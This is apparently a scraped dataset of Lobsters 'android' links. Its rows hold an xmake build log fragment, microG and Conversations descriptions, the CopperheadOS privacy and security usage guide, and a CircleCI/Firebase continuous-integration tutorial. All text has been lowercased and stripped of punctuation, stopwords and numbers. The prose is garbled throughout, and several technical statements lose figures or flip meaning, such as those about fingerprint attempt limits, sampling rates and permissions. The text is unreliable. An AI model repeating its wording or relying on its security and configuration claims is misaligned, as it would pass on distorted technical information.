compilingrelease examplec ccache compilingrelease jcapiminc ccache compilingrelease jcapistdc ccache compilingrelease jccoefctc ccache compilingrelease jccolorc ccache compilingrelease jcdctmgrc ccache compilingrelease jchuffc ccache compilingrelease jcinitc ccache compilingrelease jcmainctc ccache compilingrelease jcmarkerc ccache compilingrelease jcmasterc ccache compilingrelease jcomapic ccache compilingrelease jcparamc ccache compilingrelease jcphuffc ccache compilingrelease jcprepctc ccache compilingrelease jcsamplec ccache compilingrelease jctransc ccache compilingrelease jdapiminc ccache compilingrelease jdapistdc ccache compilingrelease jdatadstc ccache compilingrelease jdatasrcc ccache compilingrelease jdcoefctc ccache compilingrelease jdcolorc ccache compilingrelease jddctmgrc ccache compilingrelease jdhuffc ccache compilingrelease jdinputc ccache compilingrelease jdmainctc ccache compilingrelease jdmarkerc ccache compilingrelease jdmasterc ccache compilingrelease jdmergec ccache compilingrelease jdphuffc ccache compilingrelease jdpostctc ccache compilingrelease jdsamplec ccache compilingrelease jdtransc ccache compilingrelease jerrorc ccache compilingrelease jfdctfltc ccache compilingrelease jfdctfstc ccache compilingrelease jfdctintc ccache compilingrelease jidctfltc ccache compilingrelease jidctfstc ccache compilingrelease jidctintc ccache compilingrelease jidctredc ccache compilingrelease jmemansic ccache compilingrelease jmemmgrc ccache compilingrelease jmemnamec ccache compilingrelease jmemnobsc ccache compilingrelease ccache compilingrelease ccache compilingrelease jutilsc ccache compilingrelease rdbmpc ccache compilingrelease rdcolmapc ccache compilingrelease rdgifc ccache compilingrelease rdppmc ccache compilingrelease rdrlec ccache compilingrelease rdswitchc ccache compilingrelease rdtargac ccache compilingrelease transuppc ccache compilingrelease wrbmpc ccache compilingrelease wrgifc ccache compilingrelease wrppmc ccache compilingrelease wrrlec ccache compilingrelease wrtargac archivingrelease ccache compilingrelease wrjpgcomc linkingrelease wrjpgcom ccache compilingrelease linkingrelease ccache compilingrelease jpegtranc linkingrelease jpegtran ccache compilingrelease djpegc linkingrelease djpeg ccache compilingrelease ckconfigc linkingrelease ckconfig ccache compilingrelease rdjpgcomc linkingrelease rdjpgcom ccache compilingrelease cjpegc linkingrelease cjpeg build ok addition static library also compiled executable program target binary target cjpeg binary cjpegc target ckconfig binary ckconfigc target djpeg binary djpegc target jpegtran binary jpegtranc target rdjpgcom binary rdjpgcomc target wrjpgcom binary wrjpgcomc manual configuration need add compiling source code requires special compiler option example xmake f cxflags ldflags includedirs linkdirs xmake
307,Lobsters,android,Android,microG - re-implementation of Google’s proprietary Android apps and libraries,https://microg.org/,microg reimplementation google proprietary android apps library,project freeasinfreedom reimplementation google proprietary android user space apps library described component service core gmscore detail installation instruction service framework proxy gsfproxy read gmscore documentation detail unified network location provider unifiednlp detail installation instruction map api detail installation instruction store phonesky,project freeasinfreedom reimplementation google proprietary android user space apps library linuxbased opensource mobile operating system android popular mobile operating system world also way becoming proprietary operating system core operating system still released part android open source project majority core apps get worse library apis available phone run various google apps preinstalled effectively locking thirdparty apps google ecosystem reason android described look touch kind open point several popular opensource application already require google proprietary library installed increasing demand free software community addition severe problem google proprietary software discovered android modding community led development free software clone google proprietary core library application microg project born although microg component far complete user amazed result free software user got extended application support privacycaring user reduce monitor data sent google especially older phone expect battery life improvement microg used real device also replaces google tool test emulator even used virtual mobile infrastructure component service core gmscore library app providing functionality required run apps use google play service google map android api detail installation instruction service framework proxy gsfproxy small helper utility allow apps developed google cloud device messaging use compatible google cloud messaging service included gmscore read gmscore documentation detail unified network location provider unifiednlp library provides wifi celltowerbased geolocation application use google network location provider included gmscore also run independently android system detail installation instruction map api system library providing functionality deprecated google map api detail installation instruction store phonesky frontend application providing access google play store download update application development early stage usable application yet
308,Lobsters,android,Android,Conversations: the very last word in instant messaging,https://conversations.im/,conversation last word instant messaging,readmemd github google play store beta test conversationsim jabberxmpp domain hosting prosody ejabberd community module document prosody wiki,short excerpt entire much detailed faq found readmemd github repository install conversation conversation entirely open source licensed software developer check source github use gradle build apk file convenient way give automatic update also support development conversation buy app google play store buying app play store also give access beta test create account xmpp like email federated protocol mean one company create official xmpp account instead hundred even thousand provider one provider conversationsim like use conversationsim use web search engine choice find another provider maybe university one run ask friend run one found one use conversation create account select register new account server within create account dialog domain hosting using domain give recognizable jabber id also give flexibility migrate account different xmpp provider good compromise responsibility operate server downside dependent single provider learn conversationsim jabberxmpp domain hosting running already server somewhere willing able put necessary work one alternativein spirit federationis run recommend either prosody ejabberd strength ejabberd slightly mature nowadays prosody arguably easier set prosody need couple called community module maintained people develop prosody pick ejabberd make sure use latest version linux distribution might bundle old version set custom hostname port conversation automatically look srv record domain name point hostname port combination server provide please contact admin read document prosody wiki server operator unwilling fix enable advanced server setting expert setting conversation address book integration work address book integration designed protect privacy conversation neither uploads contact address book server fill address book unnecessary contact online roster manually add jabber id phone address book conversation use name profile picture contact make process adding jabber id address book easier click profile picture contact detail within conversation start add address book intent jid payload require conversation write permission address book also nt require copypaste jid one app another
309,Lobsters,android,Android,"Noise, a fork of Signal without the hard dependency on Google Cloud Messaging",https://copperhead.co/android/docs/usage_guide#messaging,noise fork signal without hard dependency google cloud messaging,technical overview permission model network permission sensor permission location tracking input logging still capable recognizing speech background access clipboard audio recording sensor location serial number display apps storage file management location user profile force always tor vpn native debugging usb peripheral camera lockscreen quick setting restriction wifi scanning beyond usual implementation privacy associated access point ap lte mode network connection information statistic default connection made copperheados gps almanac http http http dns stellar privacy policy decent one app spawning time exec spawning feature update pixel phone setting update security disabling update authentication encryption adding support setting optional knowledgebased factor fingerprint unlock attempt keyboard personalized suggestion fdroid repository app recommendation builtin userfacing apps section browsing due copperheados privacy enhancement browsing plan change red shift messaging conversation option signal site silence whatsapp youtube map simple fast highly usable mapsme available site functionality rich note important configure osmand use internal storage directory google map advanced camera feature uber http mubercom chromecast installing apps play store verified boot documentation verified boot verified boot attestation pixel later verified boot fingerprint,copperheados linuxbased mobile operating system focus privacy security build latest stable release android open source project android without google apps service copperheados considered degoogled far default copperheados install google play service interact withthis usage guide document user experience o focus compare android operating system security feature kept unintrusive without userfacing impact see technical overview documentation security feature rather change user experiencecopperheados run android apps unless hard dependency google service ship fdroid app store provide access thousand open source apps also run many apps amazon appstore google play storesince nt include google apps service copperheados nt limited requirement imposed google operating system considered android compatible disregard constraint required actually android still retaining ability run nearly real world android apps tied google android device nt permitted ship many feature documented like network permission togglepermission modelapps run application sandbox access little internal data interface explicitly exported base system apps capability need granted permission system permission divided normal permission like ability set alarm start boot dangerous permission need explicitly granted userscopperheados stock android use runtime permission model apps targeting modern android platform dangerous permission group camera contact microphone etc disabled default apps need request user needed expectation attempt handle getting permission dangerous permission group also toggled via setting apps notification app info app name permission modern apps expected handle request permission needed dangerous permission group also audited toggled group instead app using setting apps notification app permissionsfor apps targeting old version android platform stock android grant requested dangerous permission install time dangerous permission group still toggled via setting apps notification app info app name permission provide empty data possible rather failing compatibility contrast copperheados present user menu review disable dangerous permission group app able run substantial difference stock android nt give user chance toggle permission app able run installing toggling manually launching app adequate possible started thatnote android make possible apps get without permission case app user pick contact take picture store open file storage provider etc without permission required skeptical justification given app developer permission usage example many claim need read phone state phone permission group detect active phone call almost always false justification could using standard audio focus mechanismnetwork permissionunlike stock android copperheados treat full network access userfacing permission toggle compatibility enabled default apps targeting modern android platform unlike runtime permissionsthere many known case apps exporting interface apps making limited network request toggle become useful isolation option available example web browser almost expose interface allowing apps open url choose require either internet permission explicit user consent making requestsensors permissionunlike stock android copperheados treat sensor access userfacing permission toggle compatibility enabled default apps targeting modern android platform unlike runtime permission stock android treat heartbeat sensor access dangerousunlike network toggle apps nt marked existing lowlevel permission make use sensor access copperheados add new permission treat apps requesting sensor permission toggle every appsensor access shown provide capability perform location tracking input logging crude audio recording still capable recognizing speech despite hz sampling limit enforced osbackground accesscopperheados add special permission controlling access data background setting security apps background accessthis feature become strict future early implementation aimed fleshing full set functionality working towards disabling access defaultthe powerful draw apps special permission used remain foreground need explicitly granted user manual way usual dangerous permission request dialog persistent notification displayed used also ca nt used draw system ui hide persistent notification outside scope feature quite dangerous already granted app exceptional circumstance like accessibility service device administratorsclipboardcopperheados disables access clipboard apps background default enabled perapp via setting security location apps background access access clipboard background example may need whitelist clipboard manageraudio recordinginitiating audio recording background disabled perapp via setting security location apps background access record audio background nt yet disabled default futurefor apps still initiate audio recording foreground continue background even background audio recording disabled feature eventually improved kill apps open recording stream sent backgroundsensorssensors access background disabled perapp via setting security location apps background access access sensor background nt yet disabled default futurelocationlocation access background disabled perapp via setting security location apps background access access location background nt yet disabled default futureserial numbercopperheados requires apps phone permission group read phone state access serial number like imei stock android android moving towards nt yet enforce even apps targeting android oreodisplay appsunlike stock android copperheados nt permit automatic grant special display apps permission need explicitly granted usersstorageapps private storage directory share file apps using content provider apps act storage provider provide structured request retrieve store data including shared storage directory direct scoped access also requested shared storage directory since unfortunately many apps require storage permission direct full access shared storage unwise store sensitive data therein future copperheados offer ability isolate shared storage rather toggling access isolated shared storage provide app dedicated shared storage directory accessible builtin file manager ideally apps would already use available tool provide kind functionality ownfile managementthe builtin file manager shared storage recommended available file app home screen also accessible via setting storage file shared storage shown enabling show internal storage app menu proper integration storage provider apps providing storage apps explicit user control external storage also app able access isolated shared storage directory apps feature implementedlocationthe location icon displayed status bar app monitoring device locationsettings security location location provides global toggle disable location detection along list apps made recent location requestsuser profilesuser profile offer isolated workspace within operating systemfully opening notification tray show avatar main user profile touching open menu creating switching profile configuration available via setting shortcut setting user account usersthe special guest profile meant used scratch space quick shortcut notification tray deleting everything profile also offer option clear switching itapps communicate share data across user profile pixel phone user profile separate disk encryption key user data rather shared boot password profile also record audio another profile active default owner account access phone call sm enabled account via user setting menu owner accountin addition baseline functionality copperheados expose option disallow audio recording disallow installing apps user configuration menu owner accountforce always tor vpnin setting network internet vpn gear icon next installed vpn apps like orbot tor used set one alwayson vpn make start automatically however also necessary toggle block connection without vpn disallow connection made vpn dy enabled default alwayson vpn copperheados near futurenative debuggingsupport native debugging feature disabled toggling setting security location enable native code debugging left enabled default like stock order generate useful log crash dump information crash tied bug native code disabling make information generated take bug report feature nearly useless crash caused native code still produce useful information uncaught java exception currently known app compatibility issue caused disabling nt compatible nasty trick used obfuscated apps make harder inspectusb peripheralscopperheados default ignoring connected usb peripheral screen locked controlled setting security location usb accessory option disallow new usb peripheralsallow new usb peripheral unlocked default allow new usb peripheral like stock android option impact device acting usb peripheral connected computer however android already default charge mode requires explicit optin device exposing mtp ptp midi devicecamera lockscreencopperheados add toggle setting security location camera lockscreen reducing lockscreen attack surface disallowing camera usage disables camera launch icon lower right corner lockscreen camera launch gesture lockedquick setting restrictionscopperheados restricts usage sensitive quick setting tile screen securely lockedthe following quick setting tile unlocking requirement stock android copperheados extends requirement tile bluetoothnfc present tile stock airplane modewifiautorotatedata saverhotspotcellular databatterysome tile still unlocking requirement flashlightnight lightinvert colorsdo disturbworkthe flashlight tile quite useful lockscreen add minimal attack surface night light invert color comparable brightness slider add minimal attack surface easy notice toggle similarly disturb dnd comparable volume rocker work locked quite useful functionality volume rocker already allows setting alarm dnd mode tooandroid work nt currently scope copperheados hardening work tile nt available use left android work nt aimed business deploying dedicated work device rather bring device byod wifiscanningmac randomization always enabled wifi scanning nexus pixel phone fairly unique firmware support scanning mac randomization going beyond usual implementation device identifier exposed wifi scanning beyond mac address packet sequence number assorted identifying information probe requestswifi scanning never performed wifi disabled without explicitly enabling setting security location location scanning unlike stock android thing applies bluetoothavoid using hidden aps ie aps broadcasting ssid since known hidden ssids end broadcast find ssids broadcast standard nonhidden apsprivacy associated access point ap dhcp client us anonymity profile rather sending hostname nt compromise privacy offered mac randomizationunlike stock android copperheados also provides mac randomization associated ap currently exclusive pixel phone toggled setting network internet wifi wifi preference randomize mac address restore hardware mac address wifi toggled againlte modeif reliable lte connection carrier reduce attack surface disabling connectivity setting network internet mobile network preferred network type traditional voice call work lte mode either lte connection volta voice lte support wifi connection vowifi voice wifi support volta vowifi pixel phone expected work carrier supported stock tmobile rogers fido etc verizon volta vowifi compatibility substantially worse nexus device nowthis feature intended improve confidentiality traditional call text may somewhat raise bar form interception substitute endtoend encrypted call text even transport layer encryption lte provide basic network authentication encryption network intention lte feature hardening remote exploitation disabling enormous amount legacy codenetwork connection information statisticscopperheados prevents third party apps obtaining detailed network information without permission stock android net monitor app built copperheados special exception rule network information also accessed via android debug bridge shell third party apps access information made explicitly available via documented interface permission control essentially access right valid use case third party apps covered net monitor nt presented known example using information good faith nt correct attempt implement userfacing firewall via vpn service rather properly integrated via existing o firewall infrastructure actually work properlydefault connection made copperheadosnet monitor used monitor connection o addition done apps downloadmanager service http http downloads behalf third party apps nt confused downloads triggered o itselfcopperheados make connection outside world test connectivity detect captive portal download update data varying per user installation sent connection nt analytics telemetry copperheadosthe expected connection copperheados including base system apps following copperheados updater app fetch update metadata http serverdevicechannel every hour connected permitted network update nexus nexus use legacycopperheadco pixel phone use releasecopperheadco currently hosted ovh like copperhead sitefdroid performs update check enabled repository default standard fdroid repository copperhead repository enabled copperhead repository hosted fdroidcopperheadco ovhas device qualcomm baseband provides gps gps almanac update qualcomm downloaded http http http copperheados modified reference server use http rather mix http httpsconnectivity check designed mimic web browser user agent performed using http http fetch standard url generating http status code used detect internet connectivity lost network trigger fallback available network possible check designed detect handle captive portal substitute expected empty response web page need use common domain url order bypass whitelisting system permitting access common domain url domain like copperheadco would inadequate copperheados leaf set standard four url blend crowd billion android device without google mobile service performing empty get request dns connectivity functionality testsdns resolution connectionsthe connectivity check performed o hardened chromium browserdnsunlike stock android copperheados us cloudflare dns server network connectivity test default fallback network nt provide dns server decision based cloudflare providing stellar privacy policy compared decent one google public dns cloudflare dns support dnsoverhttps dnsovertls possible use android upcoming dnsovertls supportin practice default fallback rarely used dns server provided local network preferred mobile data wifi since avoids trusting additional party information local network isp still obtain information using alternate dns server hiding information requires using vpn move trust vpn provider hopefully worthy trust isp even using dnsoverhttps dnsovertls tracking ip address leak nearly much information even http connection leak hostname unlike path little truly hidden technologiesandroid adding support overriding default dns server dnsovertls server chosen user however noted wo nt able hide much information local network isp value limited particularly form encrypted sni extension tl avoid leaking exact hostnames http rather imprecise reverse dns lookupsit possible apps implementing vpn service feature provide alternative dns server done without intercepting routing network traffic like real vpn apps use implement feature like domainbased content filteringapp spawning timeyou may notice cold start app spawning time take bit longer ie ballpark stock android due security centric exec spawning feature noticeable nexus due slowest supported device far le significant current generation hardware nt cause performance cost launching app similarly nt cause extra latency app already running cached backgroundupdates pixel phonesthe update system implement automatic background update check update per hour network connectivity downloads installs update background pick left downloads interrupted nt need worry interrupting similarly interrupting installation nt risk update installed secondary installation copperheados becomes active installation update complete update complete informed notification simply need reboot button notification via normal reboot new version fails boot o roll back past version updater attempt download install update againthe updater use incremental update download change rather whole o unless current version behind current release version long working network connectivity regular basis reboot asked almost always one past couple version o minimize bandwidth usage since incrementals always available fall version behind download large full update shipping full o update versionthe updater work device locked idle including first unlock since explicitly designed able run decryption user datasettingsthe setting available setting app system phone update settingsthe release channel setting changed default stable channel beta channel want help testing beta channel usually simply follow stable channel beta channel may used experiment new featuresthe permitted network setting control network used perform update default using network connection set nonroaming disable cellular service marked roaming unmetered disable cellular network also wifi network marked meteredthe require battery warning level setting control whether update performed battery level warning message shown standard value capacityenabling optin automatic reboot setting allows updater reboot device update idle long time setting enabled device take care number update completely automatically even left completely idleupdate securitythe update server nt trusted party since update signed verified along downgrade attack prevented update protocol nt send identifiable information update server work well vpn tor copperhead nt able comply government order build sign ship malicious update specific user device based information like imei serial number etc update server end knowing ip address used connect version upgraded based requested incrementalandroid update support serialno constraint make validate certain device copperheados reject update serialno constraint stable beta channelsdisabling updatesit highly recommended leave automatic update enabled configure permitted network bandwidth usage problem mobile data connection however possible turn update client going setting apps enabling show system via menu selecting copperheados updater disabling app need remember enable start receiving updatesauthentication encryptionusing strong passphrase recommended copperheados extends arbitrary default maximum passphrase length character characterspattern unlock strongly discouraged may turned hidden option futurefingerprint unlock act extremely convenient secondary unlock mechanism however open weakness compared knowledgebased authentication usable reboot first unlock hour nt reduce authentication encryption security case important redeeming quality making strong passphrase main unlock mechanism convenient placement scanner make even convenient swipe unlock even unlock mechanism option ie power button longterm plan copperheados build upon fingerprint unlock adding support setting optional knowledgebased factor implemented recommended authentication setup following strongest weakest strong passphrasestrong passphrase fingerprint pin weaker passphrase secondary unlock mechanismstrong passphrase fingerprint secondary unlock mechanismuntil implemented using pin weak passphrase instead second option make sense much weaker case fingerprint unlock nt available ie reboot hour timeoutcopperheados support randomizing pin entry layout via toggle setting security location password scramble pin layout disabled default apply planned factor fingerprint unlock mechanism addition using pin main unlock method discouraged better option availablefingerprint unlock attemptscopperheados disables fingerprint unlock failed attempt unlike stock android allows attempt second delay failed attemptsyou use disable fingerprint scanner intentionally making invalid unlocking attempt device vibrate invalid unlocking attempt stop vibrating fingerprint unlock disabledkeyboard personalized suggestionsthe keyboard option maintaining internal database improve suggestion based past input entirely local inaccessible apps like internal app data copperheados disables default avoid gathering persistent statistic user input may valuable attacker compromised device enabled setting language input virtual keyboard copperheados keyboard text correction personalized suggestion also accessible holding comma key keyboard pressing copperheados keyboard settingsfdroid repositorythe copperheados fdroid repository included default set reference intended useful copperheados user nothing guaranteed work elsewhere issue operating system reportedapp recommendationsbuiltin userfacing appscopperheados includes standard android open source project aosp appsthe following apps actively developed part aosp receive bug fix new feature using apps rather third party one highly recommended calculatorclockcontactsfileslauncherphonesettingsthe following apps longer actively developed part aosp receive important security fix apps keep working indefinitely since android backwards compatible wo nt receive new feature overhaul candidate replacement road replacement need good fit copperheados cameraemailgallerymusicsearch launcher icon removed copperheados included compatibility aosp apps replaced copperheados calendar etar maintained derivative backendagnostic aosp calendar app used service exposing calendar backend via app browser chromium hardened browser developed copperheados based chromium see section browsing messaging silence replaced provide endtoend sm encryption copperheados also includes additional builtin apps apps included provide functionality missing aosp compared stock android case net monitor ca nt work integrated o due copperheados privacy enhancementsfdroid app repository updatesoffline calendar local calendar storage backend alternative cloudbased backendsnet monitor monitoring network connectionspdf viewer hardened pdf viewer developed alongside copperheadosbrowsingcopperheados ship hardened build chromium robust rendering sandbox make secure option available since android webview provided chromium apps render web content using copperheados chromium build example duckduckgo us webview search app copperheados pdf viewer us render pdf document copperheados enables rendering sandbox webview since android nougat google enabling android standalone browser sandbox currently restrictive webview also mercy security app using since apps add interface grant access file content access outside webviewbrave based chromium additional feature like builtin adblocking http everywhere fingerprinting protection however currently available main fdroid repository would missing extra hardening future likely provide hardened build brave copperheados via fdroid repositoryavoid geckobased browser like firefox significantly le secure among apps able benefit full set copperheados hardening feature due shipping linker custom jit compiler within app process webview inherently chromiumbased using gecko also mean exposing attack surface two browser engine rather one firefox focus currently us system webview rather gecko mozilla plan change thatred shifton pixel use setting display night light instead third party app requiring grant special display apps permissionmessagingrecommended messaging app preference list conversation omemonoise signal communicate signal user encrypted callssilence encrypted sm communicate android user without data connectionsother apps endtoend encryption ca nt convince contact install one wire whatsapp etc apps transport encryption without endtoend encryptionunencrypted sm apps without transport encryptionconversationsthe recommended messaging client conversation xmpp client interoperable xmpp client server support endtoend encryption via robust cryptography omemo based signal protocol along otr pgp backwards compatibility lesser client one apps efficient push messaging without needing google cloud messaging gcm also support endtoend encrypted group chatconversations official xmpp server necessary extension full functionality cost eur year month free trial using official server support project recommended option without subscription fee nt currently recommendation one prefer beyond sticking support every xep gcm rather standard push mechanism signalnoise rebranded build signal available outside play store available copperhead fdroid repository full support signal feature including voice video call nt optimized low impact battery life like conversation used fork removing hard dependency google play service since signal hard dependency anymore noise nt change single line code signal brandingthe official website release signal installed site requires temporarily enabling installing apps browser still requires consent time signal check update notify ca nt support option automatic upgrade upgrade need installed hand require enabling app installs signal still requires consent time choose installing noise via fdroid receiving update via fdroid using signal website release manually installing update via notification creates ideally official release signal would available via official signal fdroid repository would nt need noise anymore least signal ship complete backup import mechanism full migration possiblesilencecopperheados replaces aosp messaging app silence provide support encrypted sm nt really recommended prefer databased encrypted messaging apps rather make use communicating contact without data connection messaging nt data connection make sense leave default sm app even using app like noise able act default sm clientwhatsappwhatsapp work copperheados nt currently available convenient way best way use probably installing amazon appstore apk installing update along appstore update itselfwe might consider trying convince facebook either host fdroid repository permit redistribution ityoutubeuse newpipe app fdroid want functionality mobile sitemapssimple fast highly usablethe around best option basic map navigation functionality mapsme privacy security issuesthe comgithubaxetmaps fork available standard fdroid repository ad binary etc stripped outthe official mapsme apk available site play store version work perfectly well copperheados toothe main issue way use internal app storage instead using shared storage internal app data like setting map downloads data exposed apps storage access could tampered simply watched location information might something fork would willing address feel free encourage project take secure approach least offer optionfunctionality richosmand openstreetmap automated navigation direction installed fdroid provides map viewing mobile navigation killer feature optional support downloading openstreetmap database chosen region addition obvious advantage dependency internet connection offline mapping offer privacy recommended use offline mode enough storage space spare note important configure osmand use internal storage directory go menu setting general setting select data storage folder option select edit button set internal application memory optionnote osmand sends semipersistent androidid server connection androidid become le identifying future copperheados release default user control offered reflects poorly osmandgoogle mapsif really need google map use web application nice mobile app core functionality turnbyturn navigation thereadvanced camera featuresinstall open camera app fdroid enable use api setting menu enables support feature like manual iso configuration hdr hdr modeon pixel pixel xl hdr via pixel visual core available apps copperheados support unfortunately aosp camera app nt currently support ituberuse http mubercom instead android app open chromium select add home screen menu unlike site uber web app set act standalone app added home screen rather launcher acting bookmark opening chromium tab map nt enabled default since web app aimed niche user low bandwidth enabledchromecastvlc support casting chromecast device support within o provided play service nt requiredinstalling apps play storethe yalp store app fdroid used install apps play store using install app press menu button press setting enable toggle download internal storage make sure yalp nt download apps shared storage apps storage access could potentially tamper installation yalp still demand storage permission even though nt required thoughit clear google feel yalp store app nt recommend using account credential unless throwaway account stick yalp store credential need apps purchased consider using fdroid support swapping apps device get trusted device play store note many paid apps use drm wo nt work without play servicesmany apps play store use google play service lot still work fine copperheados functionality like push notification may available apps nt implement fallback system without play service included osbe careful installing apps play store granting permission since overall lot le trustworthy apps fdroid repository enabled default copperheados apps fdroid serious privacy security issue nt known case malicious apps tend lot respectful privacy major deviation marked fdroid entry appsverified bootcopperheados support device verified boot support hardware verifies authenticity integrity firmware core operating system every boot core operating system verifies entire rest operating system providing full verified boot o every installation guaranteed bitforbit identical storage level otherwise would nt work updating o update pristine installation new releasea fresh installation incremental update shipping change block provide exactly result block fails verify o error correction data attempt fix issue verifying fixed block corruption fixed error displayed rebootan attacker successfully gained root access via exploit chain simply modify o partition would need exploit verified boot process exploit read altered data extremely high bar greatly raise bar privileged persistence attacker forced persist unprivileged third party app requiring exploitation o via unpatched vulnerability gain back control factory reset wipe userdata guaranteeing attacker loses persistence unless verified boot bypass o update high chance breaking attempt exploit o tooon pixel later rollback protection provided o prevents attacker root access downgrading o previous version o way roll back version working exploit verified boot etc pixel later also provide substantially better enforcement copperheados public keyverified boot primarily preventing attacker persistence also greatly raise cost tampering device based physical access especially true pixel technical detail see documentation verified bootverified boot attestation pixel later copperhead auditor app us hardware security feature supported device validate integrity operating system another android device verify device running either stock operating system copperheados bootloader locked tampering operating system occurred also detect downgrade previous version supported copperheados device google pixel pixel xlit bypassed modifying tampering operating system o receives signed device information device trusted execution environment tee including verified boot state operating system variant operating system version initial verification security provided google root certificate verification much meaningful initial pairing app primarily relies trust first use via pinningusage instruction device verified auditee must one supported device device performing verification auditor need android compatible device camerapress auditor device verifying auditeepress auditee device going verifiedpoint camera auditee qr code auditor read challengetap qr code auditor advance ahead early press back point camera auditor qr code auditee read attestationview verification attestation resultsan auditor verify number different auditee device show fingerprint first last verification time successful paired attestation result auditee verified number auditor different fingerprint unique pairing rather fingerprint shown auditor auditeeverified boot fingerprintthe bootloader display notice fingerprint verified boot key since nt builtin oem key current device use tee prevent key changed implementation limitation value manually confirming pixel xl much stringent enforcement key along rollback protection
310,Lobsters,android,Android,Continuous Integration with Android,https://medium.com/appaloosa-store-engineering/continuous-integration-with-android-14047096f3de#.4ekvemrdw,continuous integration android,continuous integration android may already read circleci setup optional recommended firebase configuration circleci documentation matter http consolefirebasegooglecom getting access firebase circleci setting environment variable circleyml machine environment javaoptions gradleopts java version dependency pre post test override post test fail saving minute build cost dependency pre dependency cachedirectories pre override machine environment androidhome binbash fi next triplet gradle play publisher appaloosa apk publishing apis welcome jungle,continuous integration androidin appaloosa search continuous improvement decided back time make big effort give android app daily user care major year android native store team got bigger got time give app overhaultargeting marshmallow nougat thus giving way new feature design revision done came lot breaking change changing flow support new runtime permission change crypto libs used android fileprovider usage also began work client implementation feature set android work quite complex business rule might require quick modification based feedback get clientsall change gave u urgent need safety time extend development practice android app may already read thing bit different android dev processspecifically feature bug fix technical chore done branch merged another branch called develop following successful pull requestfor pull request merged must meet following requirement word definition done featurebugfix completedcode review donerelease build working aka ensure proguard mess something triplechecked localesversion code name incrementedpivotaltracker project management tool status current task updatedtests passed flying color today focusing last step using circleciwhat need tested android app go today whose code github bitbucket paid firebase account plan running espresso instrumentation test circleci free choose make one build timecircleci setupadding new build github project circleci breeze link github account organisation signup flow add project view choose android project next screenyou next receive mail github circleci automatically added deploy key project also automatically run first build worry probably fail specified anything related project yet begin click wheel thingy next project name build sectionby default circleci run build new commit branch appaloosa prefer running build pull request made instead many devs work multiple branch triggering build branch whether pr made would option advised check plan pricing adjust building parallelism solution chose nowyou modify setting advanced setting screen autocancel redundant build toggle also interesting one save lot timeso pretty much circleci interact github project let quick tour firebase fetch everything need run test code real android device emulator also available optional recommended firebase configuration big kudos circleci documentation matter go http consolefirebasegooglecom fresh start create new projectonce project dashboard make sure bottom left screen blaze pricing plan needed order run test google test lab getting access firebase circlecistill firebase dashboard go project setting go permissionsthat bring quite intimidating interface known google api console want create new service account circleci push test artefact fetch result create service account eponymous section may give convenient name circleci important part give project editor role ask json private key downloadsetting environment variableswe need use file give circleci access firebase nt want version code repository public examplego back circleci project setting environment variable section add environment variable later used build firebaseproject name firebase projectfirebaseserviceaccount paste output service account jsontestlabbucket one bit tricky get way got launch dummy robo test firebase dashboard going test result whether successful matter click view source file button redirect test bucket value want url look like something like http consolecloudgooglecomstoragebrowseryourtestlabbuckettimestampdevicecircleymlthis file must located project root describes step performed circleci buildhere go section section gradle opts jdk environment javaoptions gradleopts dorggradlejvmargs xx heapdumponoutofmemoryerror java version customize dependenciesdependencies pre echo android update sdk noui filter tool extragooglegoogleplayservices sudo pip install u crcmod post gradlew assemblevanilladebug assemblevanilladebugandroidtest pdisablepredex echo firebaseserviceaccount decode home clientsecretjson sudo optgooglecloudsdkbingcloud quiet component update sudo optgooglecloudsdkbingcloud config set project firebaseproject sudo optgooglecloudsdkbingcloud quiet component install beta sudo optgooglecloudsdkbingcloud auth activateserviceaccount keyfile home clientsecretjsontest override gradlew testvanilladebugunittest pdisablepredex echo sudo optgooglecloudsdkbingcloud beta test android run app appbuildoutputsapkappvanilladebugapk test appbuildoutputsapkappvanilladebugandroidtestapk deviceids osversionids locale en orientation portrait post mkdir p circletestreportsjunit find type f regex buildtestresults xml exec cp circletestreportsjunit sudo optgooglecloudsdkbingsutil cp r u sudo optgooglecloudsdkbingsutil l g testlabbucket tail circleartifacts truefor machine section java version override required project take profit newer java jdkif gradle test failed outofmemory exception try capping memory usage javaoptions gradleoptsthe pre section dependency run circleci inferred commandshere need fully updated android sdk project also uptodate course done cli echo autoaccepts numerous android sdk term use prompt specify needed dependency target sdk buildtools version crcmod needed google cloud tool passing test firebasenext post section dependency test artefact built using gradlethe rest also needed firebase run test circleci gcloud tool updated set using environment variablesin test override section tell circleci exactly meaning running unit test espresso testsas see deduce test apks filename following respective gradle task app assemblevanilladebug output appvanilladebugapk app assemblevanilladebugandroidtest give appvanilladebugandroidtestapk always built appbuildoutputapkyou also specify device configuration want test run see menu give gcloud go run gcloud beta android device listnote build fail first error encountered wait whole thing need go step dependency met unit test pas exampleand final stage post section test simply fetch test result google test bucket note circleartifacts providedand hope test fail circleci neat interface see glance something went wrongfixing unit test easy error shown quite clearly espresso test fail worry got tapego top failed build page artifact tab find test video therecircleci build artifactsif want browse readable interface via google cloud platform go failed build scroll step redyou see url test bucket send nice interface google cloud platform browse resultsbut looking good update pull requestsaving minute build cost android build appaloosa took around leveraging circleci cache system managed quicken build time minute back circleyml file replace dependency pre echo android update sdk noui filter tool extragooglegoogleplayservices sudo pip install u crcmodby dependency cachedirectories android pre sudo pip install u crcmodoverride circledependenciesshand change androidhome environment variable machine environment androidhome homeubuntuandroidhere content circledependenciessh must unix execution permission binbashexport path androidhomeplatformtools androidhometools path androidhome mkdir androidhome cp r usrlocalandroidsdklinux androidhome echo android update sdk noui filter tool extragooglegoogleplayservices back need android sdk restore build last successful onethis unfortunately save many time expected restoring quite slow method also usual drawback cachingyour build fail update one android dependency version fix retry build without cache circleci interfacewhat next nice new feature ready code integrated test passing flying color deploy newly merged branch user device app meant consumer market look triplet gradle play publisherbut app meant private audience give appaloosa apk publishing apis try written robin sfez lead android developer appaloosawant part appaloosa head welcome jungle
